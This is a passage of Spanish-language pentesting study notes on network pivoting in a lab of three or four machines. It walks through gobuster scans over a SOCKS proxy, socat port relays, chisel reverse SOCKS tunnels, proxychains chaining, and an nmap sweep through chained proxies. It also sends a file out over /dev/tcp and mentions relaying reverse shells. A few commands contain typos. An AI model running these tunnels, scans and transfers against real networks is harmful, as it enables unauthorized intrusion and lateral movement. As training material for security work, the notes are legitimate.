gobuster <span class="token function">dir</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://<span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span> -r -t <span class="token number">20</span> -x php,txt,html,js,py
<span class="token comment"># Encontrara el host PERO ira bastante lento</span>
proxychains gobuster <span class="token function">dir</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://<span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span> -r -t <span class="token number">20</span> -x php,txt,html,js,py
<span class="token comment"># Encontrara el host y sera más OPTIMO </span>
gobuster <span class="token function">dir</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://<span class="token punctuation">{</span>Máquina3_IP<span class="token punctuation">}</span> -r -t <span class="token number">20</span> -x php,txt,html,js,py --proxy socks5://127.0.0.1:8899
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">A nivel de navegador, podríamos hacer uso de herramientas como <strong>foxy proxy</strong> para configurar un proxy de tipo <strong>SOCKS5</strong> y poder así llegar a la máquina, la configuración del mismo debería estar vinculada al localhost por el puerto  indicado (Ej.<em>8899</em>) </p></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Uso de **socat**:" dir="auto" class="heading" id="Uso_de_**socat**:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Uso de <strong>socat</strong>:</h2><div class="heading-children"><div class="el-p"><p dir="auto">Socat es una binario estático el cual nos servira para redirigir el tráfico. Por ejemplo, dado el caso de un <a data-href="SSRF - (Server-Side Request Forgery)" href="notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf-(server-side-request-forgery).html" class="internal-link" target="_self" rel="noopener nofollow">SSRF - (Server-Side Request Forgery)</a> u otro caso donde por algun motivo necesitemos desde una Máquina 3 realizar una petición a la Máquina 1, si lo intentamos como normalmente lo haríamos esto no funcionará debido a que no existe conectividad alguna entre ambas, pero sin tener conectividad entre estas habiendo sido vulnerada una Máquina 2, podríamos hacer uso de <a data-tooltip-position="top" aria-label="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" rel="noopener nofollow" class="external-link" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" target="_blank">socat</a> en esta máquina intermedia para redirigir el tráfico desde una máquina a otra. </p></div><div class="el-p"><p dir="auto">Es decir aplicar con <strong>socat</strong> un redireccionamiento desde la Máquina 2 para toda petición entrante por un determinado puerto sea redirigida a un dirección especifica, en este caso, la Máquina 1. </p></div><div class="el-p"><p dir="auto"><code>./socat TCP-LISTEN:{port},fork TCP:{ip}:{port2}</code></p></div><div class="el-h4 heading-wrapper"><h4 data-heading="Redirigimos todo el tráfico ingresante por un determinado puerto a una determinada dirección ip y su respectivo puerto." dir="auto" class="heading" id="Redirigimos_todo_el_tráfico_ingresante_por_un_determinado_puerto_a_una_determinada_dirección_ip_y_su_respectivo_puerto."><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Redirigimos todo el tráfico ingresante por un determinado puerto a una determinada dirección ip y su respectivo puerto.</h4><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token comment"># Si realizamos lo siguiente no habra conectividad de primeras: </span>

<span class="token comment"># Máquina 1 </span>
python3 -m htt.server <span class="token number">80</span>

<span class="token comment"># Máquina 3 </span>
<span class="token function">curl</span> http://<span class="token punctuation">{</span>IP_máquina1<span class="token punctuation">}</span>/test.txt 

<span class="token comment">##########################################3</span>

<span class="token comment"># Si realizamos lo siguiente ahora tendríamos conectividad: </span>

<span class="token comment"># Máquina 1</span>
python3 -m http.server <span class="token number">80</span> 

<span class="token comment"># Máquina 2 </span>
socat TCP-LISTEN:4343,fork TCP:<span class="token punctuation">{</span>IP_máquina1<span class="token punctuation">}</span>:80

<span class="token comment"># Máquina 3</span>
<span class="token function">curl</span> http://<span class="token punctuation">{</span>IP-máquina2<span class="token punctuation">}</span>:4343/test.txt 
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">De esta manera todo el tráfico será constantemente redirigido de un lado al otro para poder tener conexión, siempre se le tiene que enviar traza al nodo más cercano: </p></div><div class="el-p"><p dir="auto"><span alt="enviroment_pivoting_3_machines.png" src="enviroment_pivoting_3_machines.png" class="internal-embed media-embed image-embed is-loaded"><img alt="enviroment_pivoting_3_machines.png" src="lib/media/enviroment_pivoting_3_machines.png"></span></p></div><div class="el-p"><p dir="auto">En este ejemplo, contamos con la Máquina 1 de IP <strong>192.168.1.38</strong> la cual se encuentra en el mismo segmento de red que la Máquina 2 (<strong>192.168.1.33</strong>) la cual a su vez tiene un segundo segmento de red (10.10.0.0/24) compartido con una Máquina 3 (<strong>10.10.0.129</strong>)</p></div><div class="el-p"><p dir="auto">De manera que si desde la Máquina 1 queremos poder tener traza con la Máquina 3 habría que hacer uso de <strong>chisel</strong> </p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 1:" dir="auto" class="heading" id="Máquina_1:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 1:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>chisel server --reverse -p 1234</code></p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 2:" dir="auto" class="heading" id="Máquina_2:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 2:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>chisel client 192.168.1.38:1234 R:4000:socks</code></p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 1:" dir="auto" class="heading" id="Máquina_1:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 1:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>echo "127.0.0.1 4000" &gt;&gt; /etc/proxychains4.conf</code><br>
<code>proxychains curl -s -X GET http://10.10.0.129</code></p></div><div class="el-p"><p dir="auto">De esta manera haciendo uso de chisel desde la máquian 1 creamos un servidor por el puerto 1234, desde la máquina intermediaria nos conectamos a este servidor fijando en el puerto 4000 de la máquina dueña del servidor de chisel un tunel para el tráfico. De manera que si configuramos las reglas correctamente en el archivo <strong>proxychains4.conf</strong> indicando el puerto, la máquina 1 tendrá una manera de conectar con la máquina 3 pasando toda la conexión mediante este tráfico. </p></div><div class="el-p"><p dir="auto">De manera que se podrá conectar mediante ssh, entre otras cosas. </p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 1:" dir="auto" class="heading" id="Máquina_1:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 1:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>proxychains ssh root@10.10.0.129</code></p></div><div class="el-p"><p dir="auto">Por otro lado, si lo que necesitamos es un "traspaso" de archivos, envíos de reverse shells, etc. Necesitaremos hacer uso de <strong>socat</strong>, donde una vez más la máquina intermediaria se tendra que ocupar de redirigir todo el tráfico de red entrante por un puerto a una determinada dirección. </p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 1:" dir="auto" class="heading" id="Máquina_1:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 1:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>nc -nlvp 443 &gt; binary.txt</code></p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 2:" dir="auto" class="heading" id="Máquina_2:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 2:</h4><div class="heading-children"><div class="el-p"><p dir="auto"> <code>socat TCP-LISTEN:5566,fork TCP:192.168.1.38:443</code></p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 3:" dir="auto" class="heading" id="Máquina_3:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 3:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>cat &lt; binary.txt &gt; /dev/tcp/10.10.0.128/5566</code></p></div><div class="el-p"><p dir="auto">De esta manera la máquina 2 se encarga de recibir conexiones por el puerto 5566 y redirigirlo a la IP de la máquina 1 por el puerto 443 donde la máquina 1 se encuentra escuchando. </p></div><div class="el-hr"><hr></div></div></div></div></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Múltiples conexiones y máquinas" dir="auto" class="heading" id="Múltiples_conexiones_y_máquinas">Múltiples conexiones y máquinas</h1><div class="heading-children"><div class="el-p"><p dir="auto">Ahora, tenemos casos en donde no es un entorno "chico" donde solamente hay 3 máquinas, podría haber 4, 5, 6, etc. En estos casos sigue siendo lo mismo pero con algunos detalles a tener en cuenta. </p></div><div class="el-p"><p dir="auto">Para hacer uso de <strong>chisel</strong> será lo mismo, supongamos que tenemos 4 máquinas. </p></div><div class="el-p"><p dir="auto"><span alt="pivoting_4_machines.png" src="pivoting_4_machines.png" class="internal-embed media-embed image-embed is-loaded"><img alt="pivoting_4_machines.png" src="lib/media/pivoting_4_machines.png"></span></p></div><div class="el-p"><p dir="auto">Si quisieramos desde la Máquina 1 tener conexión con la máquina 4, deberíamos empezar a jugar con proxy de tipo <strong>dynamic_chain</strong> en lugar de <strong>strict_chain</strong>, de manera que esto se configura una vez más en el archivo de configuración <strong>/etc/proxychains4.conf</strong>.<br>
Es importante tener en cuenta que al final de este archivo de confoguración se indicaran los múltiples tuneles <strong>socks5</strong> de manera que primero estaran los últimos y por último el primero. </p></div><div class="el-p"><p dir="auto">El <strong>dinamyc_chain</strong> ofrece el mismo funcionamiento que strict. Por lo tanto también seguirá exactamente la lista de proxy que estipulo pero, a diferencia de strict, en el caso que uno de los proxy de la lista falle pasará al siguiente y de este modo podremos establecer la conexión sin problemas.</p></div><div class="el-p"><p dir="auto">No solo esto, si no que para poder llegar a la Máquina 4, tiene que haber un nuevo "cliente" de chisel corriendo en la máquina 3, pero como la máquina 3 no tiene directamente conectividad con la Máquina 1, habrá que jugar con socat para redirigir la conexión de chisel a nuestro servidor en la Máquina 1. </p></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 1:" dir="auto" class="heading" id="Máquina_1:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 1:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>chisel server --reverse -p 1234</code></p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 2:" dir="auto" class="heading" id="Máquina_2:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 2:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>chisel client {IP_Máquina1}:1234 R:1080:socks</code><br>
<code>socat TCP-LISTEN:1234,fork TCP:{IP_Máquina1}:1234</code></p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="Máquina 3:" dir="auto" class="heading" id="Máquina_3:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Máquina 3:</h4><div class="heading-children"><div class="el-p"><p dir="auto"><code>chisel client {IP_Máquina2}:1234 R:1081:socks</code></p></div><div class="el-p"><p dir="auto">De esta manera la máquina 2 funciona como puente hacía la Máquina 1 a la vez que redirige el tráfico ingresad por lo Máquina 3 a la Máquina 1, de manera que conecta  a la Máquina 3 con la Máquina 1 al servidor de chisel por el puerto 1234 indicado. De manera que el archivo de configuración de <strong>/etc/proxychains4.conf</strong> deberá tener las sigs. líneas: </p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="\# strict_chain" dir="auto" class="heading" id="\#_strict_chain"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div># strict_chain</h4><div class="heading-children"></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="dynamic_chain" dir="auto" class="heading" id="dynamic_chain"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>dynamic_chain</h4><div class="heading-children"></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="socks5 127.0.0.1 1081" dir="auto" class="heading" id="socks5_127.0.0.1_1081"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>socks5 127.0.0.1 1081</h4><div class="heading-children"></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="socks5 127.0.0.1 1080" dir="auto" class="heading" id="socks5_127.0.0.1_1080"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>socks5 127.0.0.1 1080</h4><div class="heading-children"><div class="el-p"><p dir="auto">A tener en cuenta para los escaneos de nmap y demás, que a partir de que tenemos un dual proxy, la ídea es empezar a jugar con xargs. </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">65535</span> <span class="token operator">|</span> <span class="token function">xargs</span> -p <span class="token number">500</span> -I <span class="token punctuation">{</span><span class="token punctuation">}</span> proxychains nmap -sT -Pn -p<span class="token punctuation">{</span><span class="token punctuation">}</span> --open -T5 -v -n <span class="token punctuation">{</span>ip<span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"tcp open"</span>
</code><button class="copy-code-button">Copy</button></pre></div><div class="el-p"><p dir="auto">Y para herramientas como foxy proxy lo mismo, simplemente debemos configurar el nuevo proxy, en el ejemplo dado puerto 1081.</p></div><div class="mod-footer mod-ui"></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#¿ Que es el <strong>pivoting</strong> ?"><div class="tree-item-contents heading-link" heading-name="¿ Que es el pivoting ?"><span class="tree-item-title">¿ Que es el pivoting ?</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Conceptos"><div class="tree-item-contents heading-link" heading-name="Conceptos"><span class="tree-item-title">Conceptos</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="6"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Downloading_Chisel_(Linux)"><div class="tree-item-contents heading-link" heading-name="Downloading Chisel (Linux)"><span class="tree-item-title">Downloading Chisel (Linux)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="6"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Downloading_Chisel_(Windows)"><div class="tree-item-contents heading-link" heading-name="Downloading Chisel (Windows)"><span class="tree-item-title">Downloading Chisel (Windows)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Recordemos_que_así_como_podemos_establecer_un_tunel_a_la_vez_podemos_traernos_un_puerto_especifico_así_como_un_protocolo_distinto:"><div class="tree-item-contents heading-link" heading-name="Recordemos que así como podemos establecer un tunel a la vez podemos traernos un puerto especifico así como un protocolo distinto:"><span class="tree-item-title">Recordemos que así como podemos establecer un tunel a la vez podemos traernos un puerto especifico así como un protocolo distinto:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#ACLARACIÓN:_Para_que_funcione_nmap_a_través_del_proxychain_es_necesario_el_parametro_-Pn_y_-sT."><div class="tree-item-contents heading-link" heading-name="ACLARACIÓN: Para que funcione nmap a través del proxychain es necesario el parametro -Pn y -sT."><span class="tree-item-title">ACLARACIÓN: Para que funcione nmap a través del proxychain es necesario el parametro -Pn y -sT.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Uso_de_**socat**:"><div class="tree-item-contents heading-link" heading-name="Uso de **socat**:"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Uso de <strong>socat</strong>:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Redirigimos_todo_el_tráfico_ingresante_por_un_determinado_puerto_a_una_determinada_dirección_ip_y_su_respectivo_puerto."><div class="tree-item-contents heading-link" heading-name="Redirigimos todo el tráfico ingresante por un determinado puerto a una determinada dirección ip y su respectivo puerto."><span class="tree-item-title">Redirigimos todo el tráfico ingresante por un determinado puerto a una determinada dirección ip y su respectivo puerto.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_1:"><div class="tree-item-contents heading-link" heading-name="Máquina 1:"><span class="tree-item-title">Máquina 1:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_2:"><div class="tree-item-contents heading-link" heading-name="Máquina 2:"><span class="tree-item-title">Máquina 2:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_1:"><div class="tree-item-contents heading-link" heading-name="Máquina 1:"><span class="tree-item-title">Máquina 1:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_1:"><div class="tree-item-contents heading-link" heading-name="Máquina 1:"><span class="tree-item-title">Máquina 1:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_1:"><div class="tree-item-contents heading-link" heading-name="Máquina 1:"><span class="tree-item-title">Máquina 1:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_2:"><div class="tree-item-contents heading-link" heading-name="Máquina 2:"><span class="tree-item-title">Máquina 2:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_3:"><div class="tree-item-contents heading-link" heading-name="Máquina 3:"><span class="tree-item-title">Máquina 3:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Múltiples_conexiones_y_máquinas"><div class="tree-item-contents heading-link" heading-name="Múltiples conexiones y máquinas"><span class="tree-item-title">Múltiples conexiones y máquinas</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_1:"><div class="tree-item-contents heading-link" heading-name="Máquina 1:"><span class="tree-item-title">Máquina 1:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_2:"><div class="tree-item-contents heading-link" heading-name="Máquina 2:"><span class="tree-item-title">Máquina 2:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#Máquina_3:"><div class="tree-item-contents heading-link" heading-name="Máquina 3:"><span class="tree-item-title">Máquina 3:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#\#_strict_chain"><div class="tree-item-contents heading-link" heading-name="\# strict_chain"><span class="tree-item-title"># strict_chain</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#dynamic_chain"><div class="tree-item-contents heading-link" heading-name="dynamic_chain"><span class="tree-item-title">dynamic_chain</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#socks5_127.0.0.1_1081"><div class="tree-item-contents heading-link" heading-name="socks5 127.0.0.1 1081"><span class="tree-item-title">socks5 127.0.0.1 1081</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\networks\pivoting\pivoting.html#socks5_127.0.0.1_1080"><div class="tree-item-contents heading-link" heading-name="socks5 127.0.0.1 1080"><span class="tree-item-title">socks5 127.0.0.1 1080</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>